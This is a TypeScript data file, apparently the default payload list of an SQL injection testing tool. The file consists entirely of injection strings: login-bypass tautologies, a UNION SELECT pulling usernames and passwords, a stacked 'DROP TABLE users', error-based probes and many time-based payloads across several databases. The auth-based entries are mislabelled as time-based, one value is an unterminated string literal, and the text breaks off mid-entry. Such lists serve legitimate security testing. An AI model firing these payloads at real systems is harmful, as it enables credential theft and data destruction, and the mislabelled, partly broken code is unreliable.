import { SQLPayload } from '../types';

export const defaultPayloads: SQLPayload[] = [
  {
    id: '1',
    name: 'Basic Tautology',
    description: 'Always true condition using OR',
    category: 'tautology',
    value: "' OR '1'='1"
  },
  {
    id: '2',
    name: 'Union Select',
    description: 'Basic UNION-based injection',
    category: 'union',
    value: "' UNION SELECT username, password FROM users--"
  },
  {
    id: '3',
    name: 'Stacked Queries',
    description: 'Multiple query execution',
    category: 'stacked',
    value: "'; DROP TABLE users--"
  },
  {
    id: '4',
    name: 'Error-Based',
    description: 'Trigger database errors',
    category: 'error',
    value: "' AND 1=CONVERT(int, (SELECT @@version))--"
  },
  {
    id: 'id-fgz8qqpgb-1743917105364',
    name: 'Payload 5',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '\''
  },
  {
    id: 'id-raiortsk6-1743917105364',
    name: 'Payload 6',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '\'\''
  },
  {
    id: 'id-xwdvy0z0s-1743917105364',
    name: 'Payload 7',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '`'
  },
  {
    id: 'id-61jptdgpu-1743917105364',
    name: 'Payload 8',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '``'
  },
  {
    id: 'id-a8lcp4m6b-1743917105364',
    name: 'Payload 9',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: ','
  },
  {
    id: 'id-0k8dg8g4d-1743917105364',
    name: 'Payload 10',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '"'
  },
  {
    id: 'id-egy2489h3-1743917105364',
    name: 'Payload 11',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '""'
  },
  {
    id: 'id-siem2at7n-1743917105364',
    name: 'Payload 12',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '/'
  },
  {
    id: 'id-rgvfjtns4-1743917105364',
    name: 'Payload 13',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '//'
  },
  {
    id: 'id-qogra3lxq-1743917105364',
    name: 'Payload 14',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '\'
  },
  {
    id: 'id-jg9hl3wvr-1743917105364',
    name: 'Payload 15',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '\\'
  },
  {
    id: 'id-h13815j9d-1743917105364',
    name: 'Payload 16',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: ';'
  },
  {
    id: 'id-92hfdcw8o-1743917105364',
    name: 'Payload 17',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '\' or "'
  },
  {
    id: 'id-g2xaotxmr-1743917105364',
    name: 'Payload 18',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '-- or #'
  },
  {
    id: 'id-t6fdmxshc-1743917105364',
    name: 'Payload 19',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '\' OR \'1'
  },
  {
    id: 'id-wr7l5i4pp-1743917105364',
    name: 'Payload 20',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '\' OR 1 -- -'
  },
  {
    id: 'id-g3p8fjm1j-1743917105364',
    name: 'Payload 21',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '" OR "" = "'
  },
  {
    id: 'id-y6ew7o4a1-1743917105364',
    name: 'Payload 22',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '" OR 1 = 1 -- -'
  },
  {
    id: 'id-5fjk5tqsc-1743917105364',
    name: 'Payload 23',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '\' OR \'\' = \''
  },
  {
    id: 'id-22wpgtnor-1743917105364',
    name: 'Payload 24',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '\'=\''
  },
  {
    id: 'id-fxfkgzydf-1743917105364',
    name: 'Payload 25',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '\'LIKE\''
  },
  {
    id: 'id-t583f474c-1743917105364',
    name: 'Payload 26',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '=0--+'
  },
  {
    id: 'id-z5zxljtw2-1743917105364',
    name: 'Payload 27',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: ' OR 1=1'
  },
  {
    id: 'id-brvxacxx8-1743917105364',
    name: 'Payload 28',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '\' OR \'x\'=\'x'
  },
  {
    id: 'id-ovtqh2fap-1743917105364',
    name: 'Payload 29',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '\' AND id IS NULL; --'
  },
  {
    id: 'id-w47rvnkhi-1743917105364',
    name: 'Payload 30',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '\'\'\'\'\'\'\'\'\'\'\'\'\'UNION SELECT \'2'
  },
  {
    id: 'id-zrycrtr9o-1743917105364',
    name: 'Payload 31',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '%00'
  },
  {
    id: 'id-f9ywsrn2a-1743917105364',
    name: 'Payload 32',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '/*…*/'
  },
  {
    id: 'id-zy4b4xjzi-1743917105364',
    name: 'Payload 33',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '+'
  },
  {
    id: 'id-lgvxrd8s7-1743917105364',
    name: 'Payload 34',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '||'
  },
  {
    id: 'id-d25mac9qg-1743917105364',
    name: 'Payload 35',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '%'
  },
  {
    id: 'id-vrgi1zadz-1743917105364',
    name: 'Payload 36',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '@variable'
  },
  {
    id: 'id-a9b6mgr3t-1743917105364',
    name: 'Payload 37',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '@@variable'
  },
  {
    id: 'id-7iksmsml6-1743917105364',
    name: 'Payload 38',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: 'AND 1'
  },
  {
    id: 'id-nja39izql-1743917105364',
    name: 'Payload 39',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: 'AND 0'
  },
  {
    id: 'id-28wwzxjph-1743917105364',
    name: 'Payload 40',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: 'AND true'
  },
  {
    id: 'id-7hte4ds0a-1743917105364',
    name: 'Payload 41',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: 'AND false'
  },
  {
    id: 'id-61c9b00v8-1743917105364',
    name: 'Payload 42',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '1-false'
  },
  {
    id: 'id-ep6w86p2e-1743917105364',
    name: 'Payload 43',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '1-true'
  },
  {
    id: 'id-b5s0p8n70-1743917105364',
    name: 'Payload 44',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '1*56'
  },
  {
    id: 'id-iujxsd3dn-1743917105364',
    name: 'Payload 45',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '-2'
  },
  {
    id: 'id-0k56eihjj-1743917105364',
    name: 'Payload 46',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '1\' ORDER BY 1--+'
  },
  {
    id: 'id-g2g6q9s3j-1743917105364',
    name: 'Payload 47',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '1\' ORDER BY 2--+'
  },
  {
    id: 'id-0aqzsxm4z-1743917105364',
    name: 'Payload 48',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '1\' ORDER BY 3--+'
  },
  {
    id: 'id-dzf1h3pgl-1743917105364',
    name: 'Payload 49',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '1\' ORDER BY 1,2--+'
  },
  {
    id: 'id-pkyejwt1q-1743917105364',
    name: 'Payload 50',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '1\' ORDER BY 1,2,3--+'
  },
  {
    id: 'id-lwks59ivf-1743917105364',
    name: 'Payload 51',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '1\' GROUP BY 1,2,--+'
  },
  {
    id: 'id-ki3onkzk0-1743917105364',
    name: 'Payload 52',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '1\' GROUP BY 1,2,3--+'
  },
  {
    id: 'id-u35nnmvhr-1743917105364',
    name: 'Payload 53',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '\' GROUP BY columnnames having 1=1 --'
  },
  {
    id: 'id-nwlocolyd-1743917105364',
    name: 'Payload 54',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '-1\' UNION SELECT 1,2,3--+'
  },
  {
    id: 'id-dkbjewvjm-1743917105364',
    name: 'Payload 55',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '\' UNION SELECT sum(columnname ) from tablename --'
  },
  {
    id: 'id-nfug5rmbj-1743917105364',
    name: 'Payload 56',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '-1 UNION SELECT 1 INTO @,@'
  },
  {
    id: 'id-qdznbq4sx-1743917105364',
    name: 'Payload 57',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '-1 UNION SELECT 1 INTO @,@,@'
  },
  {
    id: 'id-wxrp9ktbt-1743917105364',
    name: 'Payload 58',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '1 AND (SELECT * FROM Users) = 1'
  },
  {
    id: 'id-fh0duj14m-1743917105364',
    name: 'Payload 59',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: '\' AND MID(VERSION(),1,1) = \'5\';'
  },
  {
    id: 'id-cdx5dxq2e-1743917105364',
    name: 'Payload 60',
    description: 'Generic SQL injection payload',
    category: 'generic',
    value: 
      '\' and 1 in (select min(name) from sysobjects where xtype = \'U\' and name > \'.\') --'
  },
  {
    id: 'id-ku7vk63ci-1743917220586',
    name: 'Time Payload 1',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'sleep(5)#'
  },
  {
    id: 'id-ms31mmi3o-1743917220586',
    name: 'Time Payload 2',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '1 or sleep(5)#'
  },
  {
    id: 'id-thhz02ko7-1743917220586',
    name: 'Time Payload 3',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '" or sleep(5)#'
  },
  {
    id: 'id-vymutwhpq-1743917220586',
    name: 'Time Payload 4',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '\' or sleep(5)#'
  },
  {
    id: 'id-892dfpa3p-1743917220586',
    name: 'Time Payload 5',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '" or sleep(5)="'
  },
  {
    id: 'id-lp1qqeklj-1743917220586',
    name: 'Time Payload 6',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '\' or sleep(5)=\''
  },
  {
    id: 'id-n3li68d7v-1743917220586',
    name: 'Time Payload 7',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '1) or sleep(5)#'
  },
  {
    id: 'id-tdkaggt76-1743917220586',
    name: 'Time Payload 8',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '") or sleep(5)="'
  },
  {
    id: 'id-kmerzcwp1-1743917220586',
    name: 'Time Payload 9',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '\') or sleep(5)=\''
  },
  {
    id: 'id-c4wnnl6y4-1743917220586',
    name: 'Time Payload 10',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '1)) or sleep(5)#'
  },
  {
    id: 'id-j25m0xxm2-1743917220586',
    name: 'Time Payload 11',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '")) or sleep(5)="'
  },
  {
    id: 'id-6x8pas64t-1743917220586',
    name: 'Time Payload 12',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '\')) or sleep(5)=\''
  },
  {
    id: 'id-p5j81qgra-1743917220586',
    name: 'Time Payload 13',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: ';waitfor delay \'0:0:5\'--'
  },
  {
    id: 'id-xuiomtkxi-1743917220586',
    name: 'Time Payload 14',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: ');waitfor delay \'0:0:5\'--'
  },
  {
    id: 'id-bm58mmi3q-1743917220586',
    name: 'Time Payload 15',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '\';waitfor delay \'0:0:5\'--'
  },
  {
    id: 'id-tw3cnchne-1743917220586',
    name: 'Time Payload 16',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '";waitfor delay \'0:0:5\'--'
  },
  {
    id: 'id-0rseq0ssk-1743917220586',
    name: 'Time Payload 17',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '\');waitfor delay \'0:0:5\'--'
  },
  {
    id: 'id-37upau05s-1743917220586',
    name: 'Time Payload 18',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '");waitfor delay \'0:0:5\'--'
  },
  {
    id: 'id-4vg3aleo3-1743917220586',
    name: 'Time Payload 19',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '));waitfor delay \'0:0:5\'--'
  },
  {
    id: 'id-167ny86uz-1743917220586',
    name: 'Time Payload 20',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '\'));waitfor delay \'0:0:5\'--'
  },
  {
    id: 'id-6dsni6nov-1743917220586',
    name: 'Time Payload 21',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '"));waitfor delay \'0:0:5\'--'
  },
  {
    id: 'id-cj2hfqurn-1743917220586',
    name: 'Time Payload 22',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'benchmark(10000000,MD5(1))#'
  },
  {
    id: 'id-kx1jbi12p-1743917220586',
    name: 'Time Payload 23',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '1 or benchmark(10000000,MD5(1))#'
  },
  {
    id: 'id-sl22eoje3-1743917220586',
    name: 'Time Payload 24',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '" or benchmark(10000000,MD5(1))#'
  },
  {
    id: 'id-5p9xju00m-1743917220586',
    name: 'Time Payload 25',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '\' or benchmark(10000000,MD5(1))#'
  },
  {
    id: 'id-o6f0kif13-1743917220586',
    name: 'Time Payload 26',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '1) or benchmark(10000000,MD5(1))#'
  },
  {
    id: 'id-uhxvrh7y2-1743917220586',
    name: 'Time Payload 27',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '") or benchmark(10000000,MD5(1))#'
  },
  {
    id: 'id-9ds96sdyx-1743917220586',
    name: 'Time Payload 28',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '\') or benchmark(10000000,MD5(1))#'
  },
  {
    id: 'id-4gxhjglsw-1743917220586',
    name: 'Time Payload 29',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '1)) or benchmark(10000000,MD5(1))#'
  },
  {
    id: 'id-pqy7bytbp-1743917220586',
    name: 'Time Payload 30',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '")) or benchmark(10000000,MD5(1))#'
  },
  {
    id: 'id-f4jcpvazd-1743917220586',
    name: 'Time Payload 31',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '\')) or benchmark(10000000,MD5(1))#'
  },
  {
    id: 'id-4uakywjux-1743917220586',
    name: 'Time Payload 32',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'pg_sleep(5)--'
  },
  {
    id: 'id-0pz20ykas-1743917220586',
    name: 'Time Payload 33',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '1 or pg_sleep(5)--'
  },
  {
    id: 'id-u422dwdpu-1743917220586',
    name: 'Time Payload 34',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '" or pg_sleep(5)--'
  },
  {
    id: 'id-ttu1uyzq0-1743917220586',
    name: 'Time Payload 35',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '\' or pg_sleep(5)--'
  },
  {
    id: 'id-hi2vwkjuf-1743917220586',
    name: 'Time Payload 36',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '1) or pg_sleep(5)--'
  },
  {
    id: 'id-r69ju98ys-1743917220586',
    name: 'Time Payload 37',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '") or pg_sleep(5)--'
  },
  {
    id: 'id-jzc647m92-1743917220586',
    name: 'Time Payload 38',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '\') or pg_sleep(5)--'
  },
  {
    id: 'id-a57g8lm2h-1743917220586',
    name: 'Time Payload 39',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '1)) or pg_sleep(5)--'
  },
  {
    id: 'id-ixvccyof1-1743917220586',
    name: 'Time Payload 40',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '")) or pg_sleep(5)--'
  },
  {
    id: 'id-vzda8375b-1743917220586',
    name: 'Time Payload 41',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '\')) or pg_sleep(5)--'
  },
  {
    id: 'id-whyhgnvvo-1743917220586',
    name: 'Time Payload 42',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND \'vRxe\'=\'vRxe'
  },
  {
    id: 'id-c5ejmoi4g-1743917220586',
    name: 'Time Payload 43',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND \'%\'=\''
  },
  {
    id: 'id-nsh4cqda5-1743917220586',
    name: 'Time Payload 44',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)'
  },
  {
    id: 'id-ir2791u20-1743917220586',
    name: 'Time Payload 45',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--'
  },
  {
    id: 'id-821sl9ioz-1743917220586',
    name: 'Time Payload 46',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#'
  },
  {
    id: 'id-1z8pvj161-1743917220586',
    name: 'Time Payload 47',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'SLEEP(5)#'
  },
  {
    id: 'id-tg5t8xccb-1743917220586',
    name: 'Time Payload 48',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'SLEEP(5)--'
  },
  {
    id: 'id-70twct9cu-1743917220586',
    name: 'Time Payload 49',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'SLEEP(5)="'
  },
  {
    id: 'id-j749b3x2s-1743917220586',
    name: 'Time Payload 50',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'SLEEP(5)=\''
  },
  {
    id: 'id-ksax1s3xh-1743917220586',
    name: 'Time Payload 51',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'or SLEEP(5)'
  },
  {
    id: 'id-b5ej0b9ly-1743917220586',
    name: 'Time Payload 52',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'or SLEEP(5)#'
  },
  {
    id: 'id-w3bk0coac-1743917220586',
    name: 'Time Payload 53',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'or SLEEP(5)--'
  },
  {
    id: 'id-y72p5zg78-1743917220586',
    name: 'Time Payload 54',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'or SLEEP(5)="'
  },
  {
    id: 'id-6salx8ins-1743917220586',
    name: 'Time Payload 55',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'or SLEEP(5)=\''
  },
  {
    id: 'id-2mdsq5orc-1743917220586',
    name: 'Time Payload 56',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'waitfor delay \'00:00:05\''
  },
  {
    id: 'id-tm5u86sbr-1743917220586',
    name: 'Time Payload 57',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'waitfor delay \'00:00:05\'--'
  },
  {
    id: 'id-azbld4f61-1743917220586',
    name: 'Time Payload 58',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'waitfor delay \'00:00:05\'#'
  },
  {
    id: 'id-fm1fjfism-1743917220586',
    name: 'Time Payload 59',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'benchmark(50000000,MD5(1))'
  },
  {
    id: 'id-m22svh7kj-1743917220586',
    name: 'Time Payload 60',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'benchmark(50000000,MD5(1))--'
  },
  {
    id: 'id-fijd5jd41-1743917220586',
    name: 'Time Payload 61',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'benchmark(50000000,MD5(1))#'
  },
  {
    id: 'id-7yqaa2b5y-1743917220586',
    name: 'Time Payload 62',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'or benchmark(50000000,MD5(1))'
  },
  {
    id: 'id-x3hqsc6cw-1743917220586',
    name: 'Time Payload 63',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'or benchmark(50000000,MD5(1))--'
  },
  {
    id: 'id-uldkx7nwv-1743917220586',
    name: 'Time Payload 64',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'or benchmark(50000000,MD5(1))#'
  },
  {
    id: 'id-jd57oagpu-1743917220586',
    name: 'Time Payload 65',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'pg_SLEEP(5)'
  },
  {
    id: 'id-i4ssrjh8c-1743917220586',
    name: 'Time Payload 66',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'pg_SLEEP(5)--'
  },
  {
    id: 'id-qgwmfjnsj-1743917220586',
    name: 'Time Payload 67',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'pg_SLEEP(5)#'
  },
  {
    id: 'id-ylfo1o7pc-1743917220586',
    name: 'Time Payload 68',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'or pg_SLEEP(5)'
  },
  {
    id: 'id-anxm0anxd-1743917220586',
    name: 'Time Payload 69',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'or pg_SLEEP(5)--'
  },
  {
    id: 'id-a9phlqrrg-1743917220586',
    name: 'Time Payload 70',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'or pg_SLEEP(5)#'
  },
  {
    id: 'id-91laktgsz-1743917220586',
    name: 'Time Payload 71',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '\'\"'
  },
  {
    id: 'id-wkbnel7uh-1743917220586',
    name: 'Time Payload 72',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'AnD SLEEP(5)'
  },
  {
    id: 'id-rt1nj8cbw-1743917220586',
    name: 'Time Payload 73',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'AnD SLEEP(5)--'
  },
  {
    id: 'id-ejtp56lkc-1743917220586',
    name: 'Time Payload 74',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'AnD SLEEP(5)#'
  },
  {
    id: 'id-cxn2fntv5-1743917220586',
    name: 'Time Payload 75',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '&&SLEEP(5)'
  },
  {
    id: 'id-w7ro8ixko-1743917220586',
    name: 'Time Payload 76',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '&&SLEEP(5)--'
  },
  {
    id: 'id-va4hkas75-1743917220586',
    name: 'Time Payload 77',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '&&SLEEP(5)#'
  },
  {
    id: 'id-3hb6lizge-1743917220586',
    name: 'Time Payload 78',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '\' AnD SLEEP(5) ANd \'1'
  },
  {
    id: 'id-nnindh9a6-1743917220586',
    name: 'Time Payload 79',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '\'&&SLEEP(5)&&\'1'
  },
  {
    id: 'id-kkf0prwty-1743917220586',
    name: 'Time Payload 80',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'ORDER BY SLEEP(5)'
  },
  {
    id: 'id-0sceok1oc-1743917220586',
    name: 'Time Payload 81',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'ORDER BY SLEEP(5)--'
  },
  {
    id: 'id-hryy8v12d-1743917220586',
    name: 'Time Payload 82',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'ORDER BY SLEEP(5)#'
  },
  {
    id: 'id-fw0kxvee1-1743917220586',
    name: 'Time Payload 83',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '(SELECT * FROM (SELECT(SLEEP(5)))ecMj)'
  },
  {
    id: 'id-j0fpkfofk-1743917220586',
    name: 'Time Payload 84',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#'
  },
  {
    id: 'id-6pey93glk-1743917220586',
    name: 'Time Payload 85',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--'
  },
  {
    id: 'id-n8w2puoi5-1743917220586',
    name: 'Time Payload 86',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '+benchmark(3200,SHA1(1))+\''
  },
  {
    id: 'id-c9yn02fc6-1743917220586',
    name: 'Time Payload 87',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: '+ SLEEP(10) + \''
  },
  {
    id: 'id-eiaoz0ybv-1743917220586',
    name: 'Time Payload 88',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'RANDOMBLOB(500000000/2)'
  },
  {
    id: 'id-1msysx116-1743917220586',
    name: 'Time Payload 89',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'AND 2947=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB(500000000/2))))'
  },
  {
    id: 'id-ry42lhnng-1743917220586',
    name: 'Time Payload 90',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'OR 2947=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB(500000000/2))))'
  },
  {
    id: 'id-g4ad68f68-1743917220586',
    name: 'Time Payload 91',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'RANDOMBLOB(1000000000/2)'
  },
  {
    id: 'id-7h6fkeqjv-1743917220586',
    name: 'Time Payload 92',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'AND 2947=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB(1000000000/2))))'
  },
  {
    id: 'id-x3iv0p7nj-1743917220586',
    name: 'Time Payload 93',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'OR 2947=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB(1000000000/2))))'
  },
  {
    id: 'id-3fz7rz9ej-1743917220586',
    name: 'Time Payload 94',
    description: 'Generic Time-Based SQL injection payload',
    category: 'time-based',
    value: 'SLEEP(1)/*\' or SLEEP(1) or \'" or SLEEP(1) or "*/'
  },
  {
    id: 'id-aru592ypr-1743917323191',
    name: 'Time Payload 1',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '\''
  },
  {
    id: 'id-8x7x9w1nh-1743917323191',
    name: 'Time Payload 2',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '\'--'
  },
  {
    id: 'id-r8dsskaf2-1743917323191',
    name: 'Time Payload 3',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '\'#'
  },
  {
    id: 'id-4u8yvl2ej-1743917323191',
    name: 'Time Payload 4',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '\' or \'1\'=\'1'
  },
  {
    id: 'id-qzr7bc3c9-1743917323191',
    name: 'Time Payload 5',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '\' or \'1\'=\'1\'--'
  },
  {
    id: 'id-rvnmced5q-1743917323191',
    name: 'Time Payload 6',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '\' or \'1\'=\'1\'#'
  },
  {
    id: 'id-2cvaqky0h-1743917323191',
    name: 'Time Payload 7',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '\' or 1=1--'
  },
  {
    id: 'id-a1odzkr1g-1743917323191',
    name: 'Time Payload 8',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '\' or 1=1#'
  },
  {
    id: 'id-7hjg2kp2h-1743917323191',
    name: 'Time Payload 9',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
    value: '\' or 1=1/*'
  },
  {
    id: 'id-nhwbftfyy-1743917323191',
    name: 'Time Payload 10',
    description: 'Generic Time-Based SQL injection payload',
    category: 'auth-based',
